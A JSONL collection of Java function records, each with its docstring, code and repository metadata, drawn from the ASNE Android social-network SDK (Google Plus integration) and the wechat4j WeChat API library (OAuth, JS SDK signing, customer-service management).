{"docstring": "/**\n * Request ArrayList of {@link com.github.gorbin.asne.core.persons.SocialPerson} by array of userIds\n * @param userID array of user ids in social network\n * @param onRequestSocialPersonsCompleteListener listener for request ArrayList of {@link com.github.gorbin.asne.core.persons.SocialPerson}\n */\n", "func_signal": "@Override\npublic void requestSocialPersons(final String[] userID, OnRequestSocialPersonsCompleteListener onRequestSocialPersonsCompleteListener)", "code": "{\n    super.requestSocialPersons(userID, onRequestSocialPersonsCompleteListener);\n    Plus.PeopleApi.load(googleApiClient, userID).setResultCallback(new ResultCallback<People.LoadPeopleResult>() {\n        @Override\n        public void onResult(final People.LoadPeopleResult loadPeopleResult) {\n            if (loadPeopleResult.getStatus().getStatusCode() == CommonStatusCodes.SUCCESS) {\n                PersonBuffer personBuffer = loadPeopleResult.getPersonBuffer();\n                try {\n                    int count = personBuffer.getCount();\n                    SocialPerson socialPerson = new SocialPerson();\n                    final ArrayList<SocialPerson> socialPersons = new ArrayList<SocialPerson>();\n                    for (int i = 0; i < count; i++) {\n                        getSocialPerson(socialPerson, personBuffer.get(i), userID[i]);\n                        socialPersons.add(socialPerson);\n                        socialPerson = new SocialPerson();\n                    }\n                    if (mLocalListeners.get(REQUEST_GET_PERSONS) != null) {\n                        ((OnRequestSocialPersonsCompleteListener) mLocalListeners.get(REQUEST_GET_PERSONS))\n                                .onRequestSocialPersonsSuccess(getID(), socialPersons);\n                        mLocalListeners.remove(REQUEST_GET_PERSONS);\n                    }\n                } finally {\n                    personBuffer.close();\n                }\n            } else {\n                if (mLocalListeners.get(REQUEST_GET_PERSONS) != null) {\n                    mLocalListeners.get(REQUEST_GET_PERSONS)\n                            .onError(getID(), REQUEST_GET_PERSONS, \"Can't get persons\"\n                                    + loadPeopleResult.getStatus(), null);\n                    mLocalListeners.remove(REQUEST_GET_PERSONS);\n                }\n            }\n        }\n    });\n}", "path": "googleplus\\src\\main\\java\\com\\github\\gorbin\\asne\\googleplus\\GooglePlusSocialNetwork.java", "repo_name": "gorbin/ASNE", "stars": 883, "license": "None", "language": "java", "size": 4428}
{"docstring": "/**\n * Overrided for Google plus\n */\n", "func_signal": "@Override\npublic void onStop()", "code": "{\n    if (googleApiClient.isConnected()) {\n        googleApiClient.disconnect();\n    }\n}", "path": "googleplus\\src\\main\\java\\com\\github\\gorbin\\asne\\googleplus\\GooglePlusSocialNetwork.java", "repo_name": "gorbin/ASNE", "stars": 883, "license": "None", "language": "java", "size": 4428}
{"docstring": "/**\n * Request Google plus share dialog\n * @param bundle bundle containing information that should be shared(Bundle constants in {@link com.github.gorbin.asne.core.SocialNetwork})\n * @param onPostingCompleteListener listener for posting request\n */\n", "func_signal": "@Override\npublic void requestPostDialog(Bundle bundle, OnPostingCompleteListener onPostingCompleteListener)", "code": "{\n    super.requestPostDialog(bundle, onPostingCompleteListener);\n    PlusShare.Builder plusShare =  new PlusShare.Builder(mActivity)\n            .setType(\"text/plain\");\n    if(bundle != null){\n        if(bundle.containsKey(BUNDLE_MESSAGE)){\n            plusShare.setText(bundle.getString(BUNDLE_MESSAGE));\n        }\n        if(bundle.containsKey(BUNDLE_LINK)){\n            plusShare.setContentUrl(Uri.parse(bundle.getString(BUNDLE_LINK)));\n        }\n    }\n    Intent shareIntent = plusShare.getIntent();\n    mActivity.startActivityForResult(shareIntent, 0);\n}", "path": "googleplus\\src\\main\\java\\com\\github\\gorbin\\asne\\googleplus\\GooglePlusSocialNetwork.java", "repo_name": "gorbin/ASNE", "stars": 883, "license": "None", "language": "java", "size": 4428}
{"docstring": "/**\n * Called when the client is temporarily in a disconnected state.\n * @param i The reason for the disconnection. Defined by constants CAUSE_*.\n */\n", "func_signal": "@Override\npublic void onConnectionSuspended(int i)", "code": "{\n    if (mLocalListeners.get(REQUEST_LOGIN) != null) {\n        mLocalListeners.get(REQUEST_LOGIN).onError(getID(), REQUEST_LOGIN,\n                \"get person == null\", null);\n    }\n    mConnectRequested = false;\n}", "path": "googleplus\\src\\main\\java\\com\\github\\gorbin\\asne\\googleplus\\GooglePlusSocialNetwork.java", "repo_name": "gorbin/ASNE", "stars": 883, "license": "None", "language": "java", "size": 4428}
{"docstring": "/**\n * Request current user {@link com.github.gorbin.asne.core.persons.SocialPerson}\n * @param onRequestSocialPersonCompleteListener listener for {@link com.github.gorbin.asne.core.persons.SocialPerson} request\n */\n", "func_signal": "@Override\npublic void requestCurrentPerson(OnRequestSocialPersonCompleteListener onRequestSocialPersonCompleteListener)", "code": "{\n    super.requestCurrentPerson(onRequestSocialPersonCompleteListener);\n    requestPerson(\"me\", onRequestSocialPersonCompleteListener);\n}", "path": "googleplus\\src\\main\\java\\com\\github\\gorbin\\asne\\googleplus\\GooglePlusSocialNetwork.java", "repo_name": "gorbin/ASNE", "stars": 883, "license": "None", "language": "java", "size": 4428}
{"docstring": "/**\n * Request {@link com.github.gorbin.asne.core.AccessToken} of Google plus social network that you can get from onRequestAccessTokenCompleteListener\n * @param onRequestAccessTokenCompleteListener listener for {@link com.github.gorbin.asne.core.AccessToken} request\n */\n", "func_signal": "@Override\npublic void requestAccessToken(OnRequestAccessTokenCompleteListener onRequestAccessTokenCompleteListener)", "code": "{\n    super.requestAccessToken(onRequestAccessTokenCompleteListener);\n\n    AsyncTask<Activity, Void, String> task = new AsyncTask<Activity, Void, String>() {\n        Exception mException;\n\n        @Override\n        protected String doInBackground(Activity... params) {\n            String scope = \"oauth2:profile email\";\n            String account = Plus.AccountApi.getAccountName(googleApiClient);\n            String token = null;\n            try {\n                token = GoogleAuthUtil.getToken(params[0],\n                        account, scope);\n            } catch (UserRecoverableAuthException e) {\n                mConnectRequested = true;\n                mActivity.startActivityForResult(e.getIntent(), REQUEST_AUTH);\n            } catch (Exception e) {\n                e.printStackTrace();\n                mException = e;\n            }\n            return token;\n        }\n\n        @Override\n        protected void onPostExecute(String token) {\n            if(token != null) {\n                ((OnRequestAccessTokenCompleteListener) mLocalListeners.get(REQUEST_ACCESS_TOKEN))\n                        .onRequestAccessTokenComplete(getID(), new AccessToken(token, null));\n            }\n            else if(mException != null) {\n                mLocalListeners.get(REQUEST_ACCESS_TOKEN).onError(getID(), REQUEST_ACCESS_TOKEN, mException.getMessage(), mException);\n            }\n        }\n    };\n    task.execute(mActivity);\n}", "path": "googleplus\\src\\main\\java\\com\\github\\gorbin\\asne\\googleplus\\GooglePlusSocialNetwork.java", "repo_name": "gorbin/ASNE", "stars": 883, "license": "None", "language": "java", "size": 4428}
{"docstring": "/**\n * Login to social network using local listener\n * @param onLoginCompleteListener listener for login complete\n */\n", "func_signal": "public void requestLogin(OnLoginCompleteListener onLoginCompleteListener)", "code": "{\n    if (isConnected()) {\n        throw new SocialNetworkException(\"Already connected, please check isConnected() method\");\n    }\n\n    registerListener(REQUEST_LOGIN, onLoginCompleteListener);\n}", "path": "ASNECore\\src\\main\\java\\com\\github\\gorbin\\asne\\core\\SocialNetwork.java", "repo_name": "gorbin/ASNE", "stars": 883, "license": "None", "language": "java", "size": 4428}
{"docstring": "/**\n * Make login request - authorize in Google plus social network\n * @param onLoginCompleteListener listener for login complete\n */\n", "func_signal": "@Override\npublic void requestLogin(OnLoginCompleteListener onLoginCompleteListener)", "code": "{\n    super.requestLogin(onLoginCompleteListener);\n    mConnectRequested = true;\n    try {\n        mConnectionResult.startResolutionForResult(mActivity, REQUEST_AUTH);\n    } catch (Exception e) {\n        if (!googleApiClient.isConnecting()) {\n            googleApiClient.connect();\n        }\n    }\n}", "path": "googleplus\\src\\main\\java\\com\\github\\gorbin\\asne\\googleplus\\GooglePlusSocialNetwork.java", "repo_name": "gorbin/ASNE", "stars": 883, "license": "None", "language": "java", "size": 4428}
{"docstring": "/**\n * Overrided for Google plus\n * @param savedInstanceState If the activity is being re-initialized after previously being shut down then this Bundle contains the data it most recently supplied in onSaveInstanceState(Bundle). Note: Otherwise it is null.\n */\n", "func_signal": "@Override\npublic void onCreate(Bundle savedInstanceState)", "code": "{\n    super.onCreate(savedInstanceState);\n    mActivity = mSocialNetworkManager.getActivity();\n    Plus.PlusOptions plusOptions = new Plus.PlusOptions.Builder()\n            .addActivityTypes(MomentUtil.ACTIONS)\n            .build();\n    googleApiClient = new GoogleApiClient.Builder(mActivity)\n            .addApi(Plus.API,  plusOptions)\n            .addScope(Plus.SCOPE_PLUS_LOGIN)\n            .addScope(Plus.SCOPE_PLUS_PROFILE)\n            .addConnectionCallbacks(this)\n            .addOnConnectionFailedListener(this)\n            .build();\n}", "path": "googleplus\\src\\main\\java\\com\\github\\gorbin\\asne\\googleplus\\GooglePlusSocialNetwork.java", "repo_name": "gorbin/ASNE", "stars": 883, "license": "None", "language": "java", "size": 4428}
{"docstring": "//////////////////// UTIL METHODS ////////////////////\n", "func_signal": "protected void checkRequestState(AsyncTask request) throws SocialNetworkException", "code": "{\n    if (request != null) {\n        throw new SocialNetworkException(request.toString() + \"Request is already running\");\n    }\n}", "path": "ASNECore\\src\\main\\java\\com\\github\\gorbin\\asne\\core\\SocialNetwork.java", "repo_name": "gorbin/ASNE", "stars": 883, "license": "None", "language": "java", "size": 4428}
{"docstring": "/**\n * Cancel all requests\n */\n", "func_signal": "public void cancelAll()", "code": "{\n    Log.d(TAG, this + \":SocialNetwork.cancelAll()\");\n\n    // we need to call all, because in implementations we can possible do aditional work in specific methods\n    cancelLoginRequest();\n    cancelAccessTokenRequest();\n    cancelGetCurrentPersonRequest();\n    cancelGetSocialPersonRequest();\n    cancelGetSocialPersonsRequest();\n    cancelGetDetailedSocialRequest();\n    cancelPostMessageRequest();\n    cancelPostPhotoRequest();\n    cancelPostLinkRequest();\n    cancelPostDialogRequest();\n    cancelGetFriendsRequest();\n    cancelCheckIsFriendRequest();\n    cancelAddFriendRequest();\n    cancelRemoveFriendRequest();\n\n    // remove all local listeners\n    mLocalListeners = new HashMap<String, SocialNetworkListener>();\n}", "path": "ASNECore\\src\\main\\java\\com\\github\\gorbin\\asne\\core\\SocialNetwork.java", "repo_name": "gorbin/ASNE", "stars": 883, "license": "None", "language": "java", "size": 4428}
{"docstring": "/**\n * Get current user friends list\n * @param onRequestGetFriendsCompleteListener listener for getting list of current user friends\n */\n", "func_signal": "@Override\npublic void requestGetFriends(OnRequestGetFriendsCompleteListener onRequestGetFriendsCompleteListener)", "code": "{\n    super.requestGetFriends(onRequestGetFriendsCompleteListener);\n    final ArrayList<SocialPerson> socialPersons = new ArrayList<SocialPerson>();\n    final ArrayList<String> ids = new ArrayList<String>();\n    getAllFriends(null, socialPersons, ids);\n}", "path": "googleplus\\src\\main\\java\\com\\github\\gorbin\\asne\\googleplus\\GooglePlusSocialNetwork.java", "repo_name": "gorbin/ASNE", "stars": 883, "license": "None", "language": "java", "size": 4428}
{"docstring": "/**\n * Request {@link com.github.gorbin.asne.core.persons.SocialPerson} by user id\n * @param userID id of Google plus user\n * @param onRequestSocialPersonCompleteListener listener for {@link com.github.gorbin.asne.core.persons.SocialPerson} request\n */\n", "func_signal": "@Override\npublic void requestSocialPerson(String userID, OnRequestSocialPersonCompleteListener onRequestSocialPersonCompleteListener)", "code": "{\n    super.requestSocialPerson(userID, onRequestSocialPersonCompleteListener);\n    requestPerson(userID, onRequestSocialPersonCompleteListener);\n}", "path": "googleplus\\src\\main\\java\\com\\github\\gorbin\\asne\\googleplus\\GooglePlusSocialNetwork.java", "repo_name": "gorbin/ASNE", "stars": 883, "license": "None", "language": "java", "size": 4428}
{"docstring": "/**\n * Request user {@link com.github.gorbin.asne.googleplus.GooglePlusPerson} by userId - detailed user data\n * @param userId id of Google plus user\n * @param onRequestDetailedSocialPersonCompleteListener listener for request detailed social person\n */\n", "func_signal": "@Override\npublic void requestDetailedSocialPerson(final String userId, OnRequestDetailedSocialPersonCompleteListener onRequestDetailedSocialPersonCompleteListener)", "code": "{\n    super.requestDetailedSocialPerson(userId, onRequestDetailedSocialPersonCompleteListener);\n    final String user = userId == null ? \"me\" : userId;\n    Plus.PeopleApi.load(googleApiClient, user).setResultCallback(new ResultCallback<People.LoadPeopleResult>() {\n        @Override\n        public void onResult(final People.LoadPeopleResult loadPeopleResult) {\n            if (loadPeopleResult.getStatus().getStatusCode() == CommonStatusCodes.SUCCESS) {\n                PersonBuffer personBuffer = loadPeopleResult.getPersonBuffer();\n                try {\n                    int count = personBuffer.getCount();\n                    final GooglePlusPerson googlePlusPerson = new GooglePlusPerson();\n                    for (int i = 0; i < count; i++) {\n                        getDetailedSocialPerson(googlePlusPerson, personBuffer.get(i), user);\n                    }\n                    if (mLocalListeners.get(REQUEST_GET_DETAIL_PERSON) != null) {\n                        ((OnRequestDetailedSocialPersonCompleteListener) mLocalListeners.get(REQUEST_GET_DETAIL_PERSON))\n                                .onRequestDetailedSocialPersonSuccess(getID(), googlePlusPerson);\n                        mLocalListeners.remove(REQUEST_GET_DETAIL_PERSON);\n                    }\n                } finally {\n                    personBuffer.close();\n                }\n            } else {\n                if (mLocalListeners.get(REQUEST_GET_DETAIL_PERSON) != null) {\n                    mHandler.post(new Runnable() {\n                        @Override\n                        public void run() {\n                            mLocalListeners.get(REQUEST_GET_DETAIL_PERSON)\n                                    .onError(getID(), REQUEST_GET_DETAIL_PERSON, \"Can't get person\"\n                                            + loadPeopleResult.getStatus(), null);\n                            mLocalListeners.remove(REQUEST_GET_DETAIL_PERSON);\n                        }\n                    });\n                }\n            }\n        }\n    });\n}", "path": "googleplus\\src\\main\\java\\com\\github\\gorbin\\asne\\googleplus\\GooglePlusSocialNetwork.java", "repo_name": "gorbin/ASNE", "stars": 883, "license": "None", "language": "java", "size": 4428}
{"docstring": "/**\n * Overrided for Google plus\n * @param requestCode The integer request code originally supplied to startActivityForResult(), allowing you to identify who this result came from.\n * @param resultCode The integer result code returned by the child activity through its setResult().\n * @param data An Intent, which can return result data to the caller (various data can be attached to Intent \"extras\").\n */\n", "func_signal": "@Override\npublic void onActivityResult(int requestCode, int resultCode, Intent data)", "code": "{\n    super.onActivityResult(requestCode, resultCode, data);\n    int sanitizedRequestCode = requestCode & 0xFFFF;\n    if (sanitizedRequestCode == REQUEST_AUTH) {\n        if (resultCode == Activity.RESULT_OK && !googleApiClient.isConnected() && !googleApiClient.isConnecting()) {\n            // This time, connect should succeed.\n            googleApiClient.connect();\n        } else if (resultCode == Activity.RESULT_CANCELED) {\n            if (mLocalListeners.get(REQUEST_LOGIN) != null) {\n                mLocalListeners.get(REQUEST_LOGIN).onError(getID(), REQUEST_LOGIN,\n                        \"canceled\", null);\n            }\n        }\n    }\n}", "path": "googleplus\\src\\main\\java\\com\\github\\gorbin\\asne\\googleplus\\GooglePlusSocialNetwork.java", "repo_name": "gorbin/ASNE", "stars": 883, "license": "None", "language": "java", "size": 4428}
{"docstring": "/**\n * \u5237\u65b0access_token\uff08\u5982\u679c\u9700\u8981\uff09\n * <p>\u53c2\u8003<a href=\"http://mp.weixin.qq.com/wiki/17/c0f37d5704f0b64713d5d2c37b468d75.html#.E7.AC.AC.E4.B8.89.E6.AD.A5.EF.BC.9A.E5.88.B7.E6.96.B0access_token.EF.BC.88.E5.A6.82.E6.9E.9C.E9.9C.80.E8.A6.81.EF.BC.89\">\u5f00\u53d1\u6587\u6863</a></p>\n *\n * @param request\n * @return\n */\n", "func_signal": "public static RefreshAccessTokenResponse refreshAccessToken(RefreshAccessTokenRequest request) throws OAuthException", "code": "{\n    String response = post(HTTPS_API_WEIXIN_QQ_COM_SNS_OAUTH2_REFRESH_TOKEN, request);\n    check(response);\n    return JSONObject.parseObject(response, RefreshAccessTokenResponse.class);\n}", "path": "src\\org\\sword\\wechat4j\\oauth\\OAuthManager.java", "repo_name": "sword-org/wechat4j", "stars": 859, "license": "apache-2.0", "language": "java", "size": 496}
{"docstring": "/**\n * \u7ed9\u9700\u8981\u8c03\u7528JS SDK\u7684URL\u7b7e\u540d\n *\n * @param url\n * @return\n */\n", "func_signal": "public static JsApiParam signature(String url)", "code": "{\n    StringBuffer signatureSource = new StringBuffer();\n    String nonceStr = RandomStringGenerator.generate();\n    String timestamp = Long.toString(System.currentTimeMillis() / 1000);\n    String jsapiTicket = TokenProxy.jsApiTicket();\n    signatureSource.append(\"jsapi_ticket=\").append(jsapiTicket);\n    signatureSource.append(\"&noncestr=\").append(nonceStr);\n    signatureSource.append(\"&timestamp=\").append(timestamp);\n    signatureSource.append(\"&url=\").append(url);\n    logger.info(\"sign source : \" + signatureSource);\n    String signature = DigestUtils.sha1Hex(signatureSource.toString());\n    logger.info(\"sign : \" + signature);\n    return new JsApiParam(url, jsapiTicket, nonceStr, timestamp, signature);\n}", "path": "src\\org\\sword\\wechat4j\\jsapi\\JsApiManager.java", "repo_name": "sword-org/wechat4j", "stars": 859, "license": "apache-2.0", "language": "java", "size": 496}
{"docstring": "/**\n * \u4e0a\u4f20\u5ba2\u670d\u5934\u50cf\n * \u5934\u50cf\u56fe\u7247\u6587\u4ef6\u5fc5\u987b\u662fjpg\u683c\u5f0f\uff0c\u63a8\u8350\u4f7f\u7528640*640\u5927\u5c0f\u7684\u56fe\u7247\u4ee5\u8fbe\u5230\u6700\u4f73\u6548\u679c\n * @param kfAccount \u5b8c\u6574\u5ba2\u670d\u8d26\u53f7\uff0c\u683c\u5f0f\u4e3a\uff1a\u8d26\u53f7\u524d\u7f00@\u516c\u4f17\u53f7\u5fae\u4fe1\u53f7\n * @param file\t\u5ba2\u670d\u5934\u50cf\n * @return\n * @throws WeChatException \n */\n", "func_signal": "public void kfUploadHeadImg(String kfAccount,File file) throws WeChatException", "code": "{\n\tString resultStr = HttpUtils.postFile(CUSTOMSERVICE_KFACCOUNT_UPLOADHEADIMG_POST_URL+this.accessToken+\"&kf_account=\"+kfAccount,PARAM_FILE, file);\n\tWeChatUtil.isSuccess(resultStr);\n}", "path": "src\\org\\sword\\wechat4j\\csc\\CustomerServicesManager.java", "repo_name": "sword-org/wechat4j", "stars": 859, "license": "apache-2.0", "language": "java", "size": 496}
{"docstring": "/**\n * \u5173\u95ed\u4f1a\u8bdd\n * @param openid \u5ba2\u6237openid\n * @param kf_account \u5b8c\u6574\u5ba2\u670d\u8d26\u53f7\uff0c\u683c\u5f0f\u4e3a\uff1a\u8d26\u53f7\u524d\u7f00@\u516c\u4f17\u53f7\u5fae\u4fe1\u53f7\n * @param text \u5b8c\u6574\u5ba2\u670d\u8d26\u53f7\uff0c\u683c\u5f0f\u4e3a\uff1a\u8d26\u53f7\u524d\u7f00@\u516c\u4f17\u53f7\u5fae\u4fe1\u53f7\n * @return\n * @throws WeChatException \n */\n", "func_signal": "public void kfSessionClose(String openId,String kfAccount,String text) throws WeChatException", "code": "{\n\tJSONObject jsonObject = new JSONObject();\n\tjsonObject.put(\"openid\", openId);\n\tjsonObject.put(\"kf_account\", kfAccount);\n\tif (text!=null){\n\t\tjsonObject.put(\"text\", text);\t\t\t\n\t}\n\tString resultStr = HttpUtils.post(CUSTOMSERVICE_KFSESSION_CLOSE_POST_URL+this.accessToken,jsonObject.toJSONString());\n\tWeChatUtil.isSuccess(resultStr);\n}", "path": "src\\org\\sword\\wechat4j\\csc\\CustomerServicesManager.java", "repo_name": "sword-org/wechat4j", "stars": 859, "license": "apache-2.0", "language": "java", "size": 496}
{"docstring": "/**\n * post \u8bf7\u6c42\n *\n * @param url\n * @param data\n * @return\n */\n", "func_signal": "private static String post(String url, Object data)", "code": "{\n    List<NameValuePair> params = new ArrayList<NameValuePair>();\n    if (data != null) {\n        Field[] fields = data.getClass().getDeclaredFields();\n        for (Field field : fields) {\n            field.setAccessible(true);\n            Object value = null;\n            try {\n                value = field.get(data);\n            } catch (IllegalAccessException e) {\n                // never throws\n            }\n            if (value != null) {\n                params.add(new BasicNameValuePair(field.getName(), value.toString()));\n            }\n        }\n    }\n    try {\n        HttpEntity entity = Request.Post(url)\n                .bodyForm(params.toArray(new NameValuePair[params.size()]))\n                .execute().returnResponse().getEntity();\n        return entity != null ? EntityUtils.toString(entity, Consts.UTF_8) : null;\n    } catch (Exception e) {\n        logger.error(\"post\u8bf7\u6c42\u5f02\u5e38\uff0c\" + e.getMessage() + \"\\n post url:\" + url);\n        e.printStackTrace();\n    }\n    return null;\n}", "path": "src\\org\\sword\\wechat4j\\oauth\\OAuthManager.java", "repo_name": "sword-org/wechat4j", "stars": 859, "license": "apache-2.0", "language": "java", "size": 496}
{"docstring": "/**\n * \u751f\u6210OAuth\u91cd\u5b9a\u5411URI\uff08\u7528\u6237\u540c\u610f\u6388\u6743\uff0c\u83b7\u53d6code\uff09\n * <p>\u53c2\u8003<a href=\"http://mp.weixin.qq.com/wiki/17/c0f37d5704f0b64713d5d2c37b468d75.html#.E7.AC.AC.E4.B8.80.E6.AD.A5.EF.BC.9A.E7.94.A8.E6.88.B7.E5.90.8C.E6.84.8F.E6.8E.88.E6.9D.83.EF.BC.8C.E8.8E.B7.E5.8F.96code\">\u5f00\u53d1\u6587\u6863</a></p>\n *\n * @param redirectURI\n * @param scope\n * @param state\n * @return\n */\n", "func_signal": "public static String generateRedirectURI(String redirectURI, String scope, String state)", "code": "{\n    StringBuffer url = new StringBuffer();\n    url.append(HTTPS_OPEN_WEIXIN_QQ_COM_CONNECT_OAUTH2_AUTHORIZE);\n    url.append(\"?appid=\").append(urlEncode(Config.instance().getAppid()));\n    url.append(\"&redirect_uri=\").append(urlEncode(redirectURI));\n    url.append(\"&response_type=code\");\n    url.append(\"&scope=\").append(urlEncode(scope));\n    url.append(\"&state=\").append(urlEncode(state));\n    url.append(\"#wechat_redirect\");\n    return url.toString();\n}", "path": "src\\org\\sword\\wechat4j\\oauth\\OAuthManager.java", "repo_name": "sword-org/wechat4j", "stars": 859, "license": "apache-2.0", "language": "java", "size": 496}
{"docstring": "/**\n * \u83b7\u53d6\u5728\u7ebf\u5ba2\u670d\u63a5\u5f85\u4fe1\u606f\n * @return\n */\n", "func_signal": "public List<CustomerServices> getOnlieKfList()", "code": "{\n\tString resultStr = HttpUtils.get(CUSTOMSERVICE_GETONLIEKFLIST_GET_URL+this.accessToken);\t\t\n\ttry {\n\t\tWeChatUtil.isSuccess(resultStr);\n\t} catch (WeChatException e) {\n\t\tlogger.error(e.getMessage());\n\t\te.printStackTrace();\n\t\treturn null;\n\t}\n\tJSONObject jsonObject = JSONObject.parseObject(resultStr);\n\tList<CustomerServices> list = JSON.parseArray(jsonObject.getString(\"kf_online_list\"),  CustomerServices.class);\n\treturn list;\n}", "path": "src\\org\\sword\\wechat4j\\csc\\CustomerServicesManager.java", "repo_name": "sword-org/wechat4j", "stars": 859, "license": "apache-2.0", "language": "java", "size": 496}
{"docstring": "/**\n * \u5220\u9664\u5ba2\u670d\u8d26\u53f7\n * @param kfAccount\t\u5b8c\u6574\u5ba2\u670d\u8d26\u53f7\uff0c\u683c\u5f0f\u4e3a\uff1a\u8d26\u53f7\u524d\u7f00@\u516c\u4f17\u53f7\u5fae\u4fe1\u53f7\n * @return\n * @throws WeChatException \n */\n", "func_signal": "public void kfDelAccount(String kfAccount) throws WeChatException", "code": "{\n\tString resultStr = HttpUtils.post(CUSTOMSERVICE_KFACCOUNT_DEL_POST_URL+this.accessToken+\"&kf_account=\"+kfAccount);\n\tWeChatUtil.isSuccess(resultStr);\n}", "path": "src\\org\\sword\\wechat4j\\csc\\CustomerServicesManager.java", "repo_name": "sword-org/wechat4j", "stars": 859, "license": "apache-2.0", "language": "java", "size": 496}
{"docstring": "/**\n * \u83b7\u53d6\u672a\u63a5\u5165\u4f1a\u8bdd\u5217\u8868\n * @return\n */\n", "func_signal": "public List<CustomerServicesSession> getWaitCaseList()", "code": "{\n\tString resultStr = HttpUtils.get(CUSTOMSERVICE_KFSESSION_GETWAITCASE_GET_URL+this.accessToken);\n\ttry {\n\t\tWeChatUtil.isSuccess(resultStr);\n\t} catch (WeChatException e) {\n\t\tlogger.error(e.getMessage());\n\t\te.printStackTrace();\n\t\treturn null;\n\t}\n\tString waitcaselist = JSON.parseObject(resultStr).getString(\"waitcaselist\");\n\tList<CustomerServicesSession> customerServicesSessions = JSON.parseArray(waitcaselist, CustomerServicesSession.class);\n\treturn customerServicesSessions;\n}", "path": "src\\org\\sword\\wechat4j\\csc\\CustomerServicesManager.java", "repo_name": "sword-org/wechat4j", "stars": 859, "license": "apache-2.0", "language": "java", "size": 496}
{"docstring": "/**\n * \u8bbe\u7f6e\u5ba2\u670d\u4fe1\u606f\n * @param kf_account \u5b8c\u6574\u5ba2\u670d\u8d26\u53f7\uff0c\u683c\u5f0f\u4e3a\uff1a\u8d26\u53f7\u524d\u7f00@\u516c\u4f17\u53f7\u5fae\u4fe1\u53f7\n * @param nickname\t\u5ba2\u670d\u6635\u79f0\uff0c\u6700\u957f6\u4e2a\u6c49\u5b57\u621612\u4e2a\u82f1\u6587\u5b57\u7b26\n * @param password\t\u5ba2\u670d\u8d26\u53f7\u767b\u5f55\u5bc6\u7801\uff0c\u683c\u5f0f\u4e3a\u5bc6\u7801\u660e\u6587\u768432\u4f4d\u52a0\u5bc6MD5\u503c\n * @return\n * @throws WeChatException \n */\n", "func_signal": "public void kfUpdateAccount(String kfAccount,String nickName,String password) throws WeChatException", "code": "{\n\tJSONObject jsonObject = new JSONObject();\n\tjsonObject.put(\"kf_account\", kfAccount);\n\tjsonObject.put(\"nickname\", nickName);\n\tjsonObject.put(\"password\", password);\n\tString resultStr =HttpUtils.post(CUSTOMSERVICE_KFACCOUNT_UPDATE_POST_URL+this.accessToken, jsonObject.toJSONString());\n\tWeChatUtil.isSuccess(resultStr);\n}", "path": "src\\org\\sword\\wechat4j\\csc\\CustomerServicesManager.java", "repo_name": "sword-org/wechat4j", "stars": 859, "license": "apache-2.0", "language": "java", "size": 496}
{"docstring": "/**\n * \u68c0\u67e5\u54cd\u5e94\u7ed3\u679c\u662f\u5426\u6b63\u786e\n *\n * @param response\n */\n", "func_signal": "private static void check(String response) throws OAuthException", "code": "{\n    JSONObject exception = JSON.parseObject(response);\n    String errcode = exception.getString(\"errcode\");\n    String errmsg = exception.getString(\"errmsg\");\n    if (errmsg != null && !\"ok\".equals(errmsg)) {\n        throw new OAuthException(errcode, errmsg);\n    }\n}", "path": "src\\org\\sword\\wechat4j\\oauth\\OAuthManager.java", "repo_name": "sword-org/wechat4j", "stars": 859, "license": "apache-2.0", "language": "java", "size": 496}
{"docstring": "//    @Test\n", "func_signal": "public void testDownloadbill() throws PayApiException", "code": "{\n        DownloadbillRequest downloadbillRequest = new DownloadbillRequest();\n        downloadbillRequest.setNonce_str(RandomStringGenerator.generate());\n        downloadbillRequest.setBill_date(\"20151211\");\n        downloadbillRequest.setBill_type(\"ALL\");\n        System.out.println(PayManager.downloadbill(downloadbillRequest));\n    }", "path": "test\\org\\sword\\wechat4j\\pay\\PayTest.java", "repo_name": "sword-org/wechat4j", "stars": 859, "license": "apache-2.0", "language": "java", "size": 496}
{"docstring": "/**\n * \u62c9\u53d6\u7528\u6237\u4fe1\u606f(\u9700scope\u4e3a snsapi_userinfo)\n * <p>\u53c2\u8003<a href=\"http://mp.weixin.qq.com/wiki/17/c0f37d5704f0b64713d5d2c37b468d75.html#.E7.AC.AC.E5.9B.9B.E6.AD.A5.EF.BC.9A.E6.8B.89.E5.8F.96.E7.94.A8.E6.88.B7.E4.BF.A1.E6.81.AF.28.E9.9C.80scope.E4.B8.BA_snsapi_userinfo.29\">\u5f00\u53d1\u6587\u6863</a></p>\n *\n * @param request\n * @return\n */\n", "func_signal": "public static GetUserinfoResponse getUserinfo(GetUserinfoRequest request) throws OAuthException", "code": "{\n    String response = post(HTTPS_API_WEIXIN_QQ_COM_SNS_USERINFO, request);\n    check(response);\n    return JSONObject.parseObject(response, GetUserinfoResponse.class);\n}", "path": "src\\org\\sword\\wechat4j\\oauth\\OAuthManager.java", "repo_name": "sword-org/wechat4j", "stars": 859, "license": "apache-2.0", "language": "java", "size": 496}
{"docstring": "/**\n * \u4f7f\u7528UTF-8\u8fdb\u884cURL\u7f16\u7801\n *\n * @param str\n * @return\n */\n", "func_signal": "private static String urlEncode(String str)", "code": "{\n    String result = null;\n    try {\n        result = URLEncoder.encode(str, Consts.UTF_8.name());\n    } catch (UnsupportedEncodingException e) {\n        // never throws\n    }\n    return result;\n}", "path": "src\\org\\sword\\wechat4j\\oauth\\OAuthManager.java", "repo_name": "sword-org/wechat4j", "stars": 859, "license": "apache-2.0", "language": "java", "size": 496}
{"docstring": "/**\n * \u83b7\u53d6\u5ba2\u670d\u7684\u4f1a\u8bdd\u5217\u8868\n * @param KfAccount\n * @return\n */\n", "func_signal": "public List<CustomerServicesSession> getSessionList(String kfAccount)", "code": "{\n\tString resultStr = HttpUtils.get(CUSTOMSERVICE_KFSESSION_GETSESSIONLIST_GET_URL+this.accessToken+\"&kf_account=\"+kfAccount);\n\ttry {\n\t\tWeChatUtil.isSuccess(resultStr);\n\t} catch (WeChatException e) {\n\t\tlogger.error(e.getMessage());\n\t\te.printStackTrace();\n\t\treturn null;\n\t}\n\tString sessionlist = JSON.parseObject(resultStr).getString(\"sessionlist\");\n\tList<CustomerServicesSession> customerServicesSessions = JSON.parseArray(sessionlist, CustomerServicesSession.class);\n\treturn customerServicesSessions;\n}", "path": "src\\org\\sword\\wechat4j\\csc\\CustomerServicesManager.java", "repo_name": "sword-org/wechat4j", "stars": 859, "license": "apache-2.0", "language": "java", "size": 496}
